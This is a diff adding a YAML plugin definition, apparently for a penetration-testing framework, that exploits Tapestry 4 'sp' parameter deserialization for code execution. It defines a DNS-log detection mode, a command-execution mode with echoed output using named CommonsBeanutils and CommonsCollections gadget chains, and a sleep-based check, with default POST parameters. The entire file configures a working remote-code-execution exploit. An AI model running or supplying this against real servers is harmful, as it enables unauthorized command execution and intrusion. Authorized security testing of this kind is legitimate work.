@@ -1,0 +1,98 @@
+info:
+    app: Tapestry
+    name: sp
+    author: 小晨曦
+    plugin_version: 1.0.0
+    disclosure_date: "2020-12-08"
+    create_date: "2024-10-08 11:36:25"
+    update_date: "2024-10-08 11:36:25"
+    scope: Tapestry 4
+    description: Tapestry4 sp参数反序列化
+    detail: SerializableAdaptor的值为序列化数据格式，O为Base64，Z为GZIP。
+    reference: https://xz.aliyun.com/t/11226
+    vul_type: 代码执行
+payloads:
+    - name: check
+      alias: 检测漏洞
+      params:
+          - key: cmd
+            title: DNSLOG
+            param_type: edit
+            default_value: ""
+            required: true
+          - key: gadget
+            title: gadget
+            param_type: combobox
+            default_value:
+                - FindClassByDNS
+            required: true
+          - key: POST
+            title: POST参数
+            param_type: edit
+            default_value: component=%24Form&page=Home&service=direct
+            required: true
+          - key: SerializableAdaptor
+            title: SerializableAdaptor
+            param_type: combobox
+            default_value:
+                - O
+                - Z
+            required: true
+    - name: echocmd
+      alias: 回显执行命令
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: ""
+            required: true
+          - key: gadget
+            title: gadget
+            param_type: combobox
+            default_value:
+                - CommonsBeanutilsNoCC2TomcatEcho
+                - CommonsBeanutilsNoCC1TomcatEncodeEcho
+                - CommonsBeanutilsNoCC2TomcatEncodeEcho
+                - CommonsBeanutilsNoCC1SpringEncodeEcho
+                - CommonsBeanutilsNoCC2SpringEncodeEcho
+                - CommonsCollectionsK1TomcatEncodeEcho
+                - CommonsCollectionsK2TomcatEncodeEcho
+                - CommonsCollectionsK1SpringEchoEcho
+                - CommonsCollectionsK2SpringEchoEcho
+            required: true
+          - key: POST
+            title: POST参数
+            param_type: edit
+            default_value: component=%24Form&page=Home&service=direct
+            required: true
+          - key: SerializableAdaptor
+            title: SerializableAdaptor
+            param_type: combobox
+            default_value:
+                - O
+                - Z
+            required: true
+    - name: sleep
+      alias: sleep检测
+      params:
+          - key: gadget
+            title: gadget
+            param_type: combobox
+            default_value:
+                - CommonsBeanutilsNoCC1Sleep
+                - CommonsBeanutilsNoCC2Sleep
+                - CommonsCollectionsK1Sleep
+                - CommonsCollectionsK2Sleep
+            required: true
+          - key: POST
+            title: POST参数
+            param_type: edit
+            default_value: component=%24Form&page=Home&service=direct
+            required: true
+          - key: SerializableAdaptor
+            title: SerializableAdaptor
+            param_type: combobox
+            default_value:
+                - O
+                - Z
+            required: true
